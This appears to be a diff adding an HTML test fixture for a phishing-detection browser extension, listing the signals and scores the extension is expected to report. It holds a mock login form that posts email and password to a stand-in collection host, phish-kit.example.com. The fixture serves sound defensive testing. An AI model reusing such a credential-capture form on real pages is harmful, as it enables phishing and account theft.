@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Test: Phishing Combo (Multiple Signals)</title>
+  <style>
+    body { font-family: sans-serif; max-width: 600px; margin: 40px auto; }
+    .info { background: #ffebee; padding: 16px; border-radius: 8px; margin-bottom: 20px; }
+    form { background: #f5f5f5; padding: 20px; border-radius: 8px; }
+    input { display: block; margin: 10px 0; padding: 8px; width: 100%; box-sizing: border-box; }
+  </style>
+</head>
+<body>
+  <h1>Phishing Combo Detection Test</h1>
+  <div class="info">
+    <strong>Expected:</strong> Extension should detect PASSWORD_FIELD (+20) and
+    DOMAIN_MISMATCH (+30) = score 50 on free tier (ALERT triggered, threshold=40).
+    With Pro: also detects QUERY_TOKEN_PATTERN (+20) from URL param = 70 (danger).
+  </div>
+  <form action="https://phish-kit.example.com/capture" method="POST">
+    <label>Email</label>
+    <input type="email" name="email" placeholder="victim@example.com">
+    <label>Password</label>
+    <input type="password" name="password" placeholder="Enter password">
+    <button type="submit">Verify Account</button>
+  </form>
+  <script>
+    // Simulate suspicious URL parameter
+    if (!window.location.search.includes("token=")) {
+      // This page should be loaded with ?token=abc123 to trigger QUERY_TOKEN_PATTERN
+      console.log("Tip: Load this page with ?token=abc123session to trigger QUERY_TOKEN_PATTERN signal");
+    }
+  </script>
+</body>
+</html>
